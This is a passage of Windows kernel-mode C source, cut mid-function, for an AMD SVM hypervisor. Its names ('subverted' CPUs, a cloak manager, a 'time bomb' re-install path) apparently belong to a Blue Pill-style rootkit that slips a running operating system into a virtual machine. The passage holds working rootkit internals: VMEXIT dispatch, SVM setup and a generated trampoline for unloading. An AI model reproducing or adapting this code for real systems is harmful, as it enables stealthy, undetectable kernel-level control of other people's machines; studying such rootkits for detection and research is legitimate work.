		_KdPrint(("SvmDispatchNestedEvent(): original ds.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.OriginalVmcb->ds.sel,Cpu->Svm.OriginalVmcb->ds.base,Cpu->Svm.OriginalVmcb->ds.limit));
		_KdPrint(("SvmDispatchNestedEvent(): original fs.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.OriginalVmcb->fs.sel,Cpu->Svm.OriginalVmcb->fs.base,Cpu->Svm.OriginalVmcb->fs.limit));
		_KdPrint(("SvmDispatchNestedEvent(): original gs.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.OriginalVmcb->gs.sel,Cpu->Svm.OriginalVmcb->gs.base,Cpu->Svm.OriginalVmcb->gs.limit));


		_KdPrint(("SvmDispatchNestedEvent(): original gdtr.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.OriginalVmcb->gdtr.sel,Cpu->Svm.OriginalVmcb->gdtr.base,Cpu->Svm.OriginalVmcb->gdtr.limit));
		_KdPrint(("SvmDispatchNestedEvent(): original ldtr.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.OriginalVmcb->ldtr.sel,Cpu->Svm.OriginalVmcb->ldtr.base,Cpu->Svm.OriginalVmcb->ldtr.limit));
		_KdPrint(("SvmDispatchNestedEvent(): original idtr.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.OriginalVmcb->idtr.sel,Cpu->Svm.OriginalVmcb->idtr.base,Cpu->Svm.OriginalVmcb->idtr.limit));
		_KdPrint(("SvmDispatchNestedEvent(): original tr.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.OriginalVmcb->tr.sel,Cpu->Svm.OriginalVmcb->tr.base,Cpu->Svm.OriginalVmcb->tr.limit));
*/

		// restore old SparePage map
		CmPatchPTEPhysicalAddress(
			Cpu->SparePagePTE,
			Cpu->SparePage,
			Cpu->SparePagePA);


//		g_uPrintStuff=10;

#ifdef VPC_STUFF

		if (Cpu->Svm.OriginalVmcb->idtr.base!=(ULONG64)Cpu->GuestIdtArea) {

			Cpu->OldGuestIdtBase=Cpu->Svm.OriginalVmcb->idtr.base;
			Cpu->OldGuestIdtLimit=Cpu->Svm.OriginalVmcb->idtr.limit;


			Cpu->Svm.OriginalVmcb->idtr.base=(ULONG64)Cpu->GuestIdtArea;
			Cpu->Svm.OriginalVmcb->idtr.limit=BP_IDT_LIMIT;

			_KdPrint(("dummy IDTR set\n"));
		} else {
			_KdPrint(("dummy IDTR NOT set\n"));
		}
#endif


//		Cpu->Svm.OriginalVmcb->dr7|=2<<(0*2);	// dr0
//		Cpu->Svm.OriginalVmcb->dr7|=((0<<2)+0)<<(16+(0<<2));	// dr0, len 0, execute

//		RegSetDr0(Cpu->Svm.OriginalVmcb->rip);

		


//		Cpu->Svm.OriginalVmcb->exception_intercepts=0xffffffff;//Cpu->Svm.NestedVmcb->exception_intercepts;
//		Cpu->Svm.OriginalVmcb->exception_intercepts=Cpu->Svm.NestedVmcb->exception_intercepts;


	} else {

		// this event is not intercepted by the guest hypervisor.
		// Handle this by ourselves.

		SvmHandleInterception(
			Cpu,
			GuestRegs,
			Cpu->Svm.NestedVmcb,
			Cpu->Svm.NestedMsrPm);
	}
}


static VOID NTAPI SvmDispatchEvent(PCPU Cpu,PGUEST_REGS GuestRegs)
{
	if (g_uPrintStuff /*|| (Cpu->Svm.OriginalVmcb->exitcode!=VMEXIT_MSR)*/) {
		_KdPrint(("SvmDispatchEvent(): CPU#%d: VMEXIT %d, exitinfo1 0x%X, exitinfo2 0x%X\n",
			Cpu->ProcessorNumber,
			Cpu->Svm.OriginalVmcb->exitcode,
			Cpu->Svm.OriginalVmcb->exitinfo1,
			Cpu->Svm.OriginalVmcb->exitinfo2));
		_KdPrint(("SvmDispatchEvent(): RIP 0x%p, RSP 0x%p\n",
			Cpu->Svm.OriginalVmcb->rip,
			Cpu->Svm.OriginalVmcb->rsp));
/*
		_KdPrint(("SvmDispatchEvent(): GS_BASE: 0x%p\n",MsrRead(MSR_GS_BASE)));
		_KdPrint(("SvmDispatchEvent(): SHADOW_GS_BASE: 0x%p\n",MsrRead(MSR_SHADOW_GS_BASE)));
		_KdPrint(("SvmDispatchEvent(): KernGSBase: 0x%p\n",Cpu->Svm.OriginalVmcb->kerngsbase));
		_KdPrint(("SvmDispatchEvent(): efer: 0x%p\n",Cpu->Svm.OriginalVmcb->efer));
		_KdPrint(("SvmDispatchEvent(): fs.base: 0x%p\n",Cpu->Svm.OriginalVmcb->fs.base));
		_KdPrint(("SvmDispatchEvent(): gs.base: 0x%p\n",Cpu->Svm.OriginalVmcb->gs.base));
		_KdPrint(("SvmDispatchEvent(): rax: 0x%p\n",Cpu->Svm.OriginalVmcb->rax));
		_KdPrint(("SvmDispatchEvent(): cpl: 0x%p\n",Cpu->Svm.OriginalVmcb->cpl));
*/


		if (g_uPrintStuff)
			g_uPrintStuff--;
	}

	SvmHandleInterception(
		Cpu,
		GuestRegs,
		Cpu->Svm.OriginalVmcb,
		Cpu->Svm.OriginalMsrPm);


#ifdef VPC_STUFF
	if (Cpu->Svm.OriginalVmcb->idtr.base!=(ULONG64)Cpu->GuestIdtArea) {
		// inject ints if virtual GIF is 1 and we have some in the queue
		if (Cpu->uInterruptQueueSize) {

			_KdPrint(("SvmDispatchEvent(): Injecting int 0x%x\n",Cpu->InterruptQueue[0]));

			memcpy(&Cpu->Svm.GuestStateBeforeInterrupt,&((PUCHAR)Cpu->Svm.OriginalVmcb)[0x400],0xc00);

			Cpu->Svm.OriginalVmcb->rip=(ULONG64)CallIntHandlers[Cpu->InterruptQueue[0]];

			Cpu->uInterruptQueueSize--;
			memcpy(&Cpu->InterruptQueue[0],&Cpu->InterruptQueue[1],Cpu->uInterruptQueueSize);
		}
	}
#endif


}


static BOOLEAN NTAPI SvmIsNestedEvent(PCPU Cpu,PGUEST_REGS GuestRegs)
{
	if (!Cpu || !GuestRegs)
		return FALSE;

	return (BOOLEAN)(Cpu->Svm.VmcbToContinuePA.QuadPart!=Cpu->Svm.OriginalVmcbPA.QuadPart);
};


static NTSTATUS NTAPI SvmInitialize(PCPU Cpu,PVOID GuestRip,PVOID GuestRsp)
{
	PHYSICAL_ADDRESS	AlignedVmcbPA;
	ULONG64		VaDelta;
	NTSTATUS	Status;


	// do not deallocate anything here; MmShutdownManager will take care of that

	Cpu->Svm.Hsa=MmAllocateContiguousPages(SVM_HSA_SIZE_IN_PAGES,&Cpu->Svm.HsaPA);
	if (!Cpu->Svm.Hsa) {
		_KdPrint(("SvmInitialize(): Failed to allocate memory for HSA\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	_KdPrint(("SvmInitialize(): Hsa VA: 0x%p\n",Cpu->Svm.Hsa));
	_KdPrint(("SvmInitialize(): Hsa PA: 0x%X\n",Cpu->Svm.HsaPA.QuadPart));



	Cpu->Svm.OriginalVmcb=MmAllocateContiguousPages(SVM_VMCB_SIZE_IN_PAGES,&Cpu->Svm.OriginalVmcbPA);

	if (!Cpu->Svm.OriginalVmcb) {
		_KdPrint(("SvmInitialize(): Failed to allocate memory for original VMCB\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	_KdPrint(("SvmInitialize(): Vmcb VA: 0x%p\n",Cpu->Svm.OriginalVmcb));
	_KdPrint(("SvmInitialize(): Vmcb PA: 0x%X\n",Cpu->Svm.OriginalVmcbPA.QuadPart));


	Cpu->Svm.NestedVmcb=MmAllocateContiguousPages(SVM_VMCB_SIZE_IN_PAGES,&Cpu->Svm.NestedVmcbPA);
	if (!Cpu->Svm.NestedVmcb) {
		_KdPrint(("SvmInitialize(): Failed to allocate memory for nested VMCB\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	_KdPrint(("SvmInitialize(): NestedVmcb VA: 0x%p\n",Cpu->Svm.NestedVmcb));
	_KdPrint(("SvmInitialize(): NestedVmcb PA: 0x%X\n",Cpu->Svm.NestedVmcbPA.QuadPart));

	// these two PAs are equal if there're no nested VMs
	Cpu->Svm.VmcbToContinuePA=Cpu->Svm.OriginalVmcbPA;

#ifdef USE_2MB_PAGES

	VaDelta=Cpu->Svm.OriginalVmcbPA.QuadPart & 0x1fffff;
	AlignedVmcbPA.QuadPart=Cpu->Svm.OriginalVmcbPA.QuadPart & ~0x1fffff;


	MmCreateMapping(AlignedVmcbPA,(PVOID)((((ULONG64)1+Cpu->ProcessorNumber)*0x200000)),TRUE);
	Cpu->Svm._2mbVmcbMap=(PVOID)(VaDelta+(((ULONG64)1+Cpu->ProcessorNumber)*0x200000));

#endif


	if (!NT_SUCCESS(Status=SvmSetupControlArea(Cpu))) {
		_KdPrint(("Svm(): SvmSetupControlArea() failed with status 0x%08hX\n",Status));
		return Status;
	}


	if (!NT_SUCCESS(SvmEnable())) {
		_KdPrint(("SvmInitialize(): Failed to enable SVM\n"));
		return STATUS_UNSUCCESSFUL;
	}

	if (!NT_SUCCESS(Status=SvmInitGuestState(Cpu,GuestRip,GuestRsp))) {
		_KdPrint(("SvmInitialize(): SvmInitGuestState() failed with status 0x%08hX\n",Status));
		SvmDisable();
		return Status;
	}


	_KdPrint(("SvmInitialize(): SVM enabled\n"));

	SvmSetHsa(Cpu->Svm.HsaPA);
#ifdef INTERCEPT_RDTSCs
	Cpu->Tracing = 0;
#endif 
#ifdef BLUE_CHICKEN
	Cpu->ChickenQueueSize = 0;
	Cpu->ChickenQueueHead = Cpu->ChickenQueueTail = 0;
#endif

	CmCli();
	CmClgi();
	return STATUS_SUCCESS;
}



static VOID SvmGenerateTrampolineToLongModeCPL0(PCPU Cpu,PGUEST_REGS GuestRegs,PUCHAR Trampoline,BOOLEAN bSetupTimeBomb)
{
	ULONG	uTrampolineSize=0;
	PVMCB	Vmcb;


	if (!Cpu || !GuestRegs)
		return;

	// assume Trampoline buffer is big enough

	Vmcb=Cpu->Svm.OriginalVmcb;


	if (bSetupTimeBomb) {
		// pass OriginalTrampoline and ProcessorNumber to the HvmSetupTimeBomb

#ifdef BLUE_CHICKEN

		SvmGenerateTrampolineToLongModeCPL0(Cpu,GuestRegs,Cpu->OriginalTrampoline,FALSE);

		CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RCX,(ULONG64)&Cpu->OriginalTrampoline);
		CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RDX,Cpu->ProcessorNumber);

#endif

	} else {
		CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RCX,GuestRegs->rcx);
		CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RDX,GuestRegs->rdx);
	}


	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RBX,GuestRegs->rbx);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RBP,GuestRegs->rbp);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RSI,GuestRegs->rsi);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RDI,GuestRegs->rdi);

	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_R8,GuestRegs->r8);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_R9,GuestRegs->r9);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_R10,GuestRegs->r10);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_R11,GuestRegs->r11);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_R12,GuestRegs->r12);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_R13,GuestRegs->r13);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_R14,GuestRegs->r14);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_R15,GuestRegs->r15);

	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_CR0,Vmcb->cr0);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_CR2,Vmcb->cr2);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_CR3,Vmcb->cr3);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_CR4,Vmcb->cr4);


	// construct stack frame for IRETQ:
	// [TOS]		rip
	// [TOS+0x08]	cs
	// [TOS+0x10]	rflags
	// [TOS+0x18]	rsp
	// [TOS+0x20]	ss

	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX,Vmcb->ss.sel);
	CmGeneratePushReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX,Vmcb->rsp);
	CmGeneratePushReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX,Vmcb->rflags);
	CmGeneratePushReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX);
	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX,Vmcb->cs.sel);
	CmGeneratePushReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX);

	if (bSetupTimeBomb) {
#ifdef BLUE_CHICKEN
		CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX,(ULONG64)HvmSetupTimeBomb);
#endif
	} else {
		CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX,Vmcb->rip);
	}

	CmGeneratePushReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX);

	CmGenerateMovReg(&Trampoline[uTrampolineSize],&uTrampolineSize,REG_RAX,Vmcb->rax);

	CmGenerateIretq(&Trampoline[uTrampolineSize],&uTrampolineSize);

	// restore old GDTR
	CmReloadGdtr((PVOID)Cpu->Svm.OriginalVmcb->gdtr.base,Cpu->Svm.OriginalVmcb->gdtr.limit);

	// restore fs, gs
	SvmVmload(Cpu->Svm.OriginalVmcbPA);

	// restore ds, es
	CmSetDS(Cpu->Svm.OriginalVmcb->ds.sel);
	CmSetES(Cpu->Svm.OriginalVmcb->es.sel);

	// cs and ss must be the same with the guest OS in this implementation

	// restore old IDTR
	CmReloadIdtr((PVOID)Cpu->Svm.OriginalVmcb->idtr.base,Cpu->Svm.OriginalVmcb->idtr.limit);

	return;
}


static NTSTATUS NTAPI SvmShutdown(PCPU Cpu,PGUEST_REGS GuestRegs,BOOLEAN bSetupTimeBomb)
{
	UCHAR	Trampoline[0x200];

	_KdPrint(("SvmShutdown(): CPU#%d\n",Cpu->ProcessorNumber));

	InterlockedDecrement(&g_uSubvertedCPUs);

	McShutdownCloak();

	// we can unload to long mode, cpl0 only.
	// The code should be updated to build an approproate trampoline to exit to any guest mode.
	SvmGenerateTrampolineToLongModeCPL0(Cpu,GuestRegs,Trampoline,bSetupTimeBomb);

	CmStgi();
	SvmDisable();


	((VOID(*)())&Trampoline)();

	// never returns

	return STATUS_SUCCESS;
}


static NTSTATUS NTAPI SvmVirtualize(PCPU Cpu)
{
	if (!Cpu)
		return STATUS_INVALID_PARAMETER;

	SvmVmrun(Cpu);

	// never returns

	return STATUS_UNSUCCESSFUL;
}

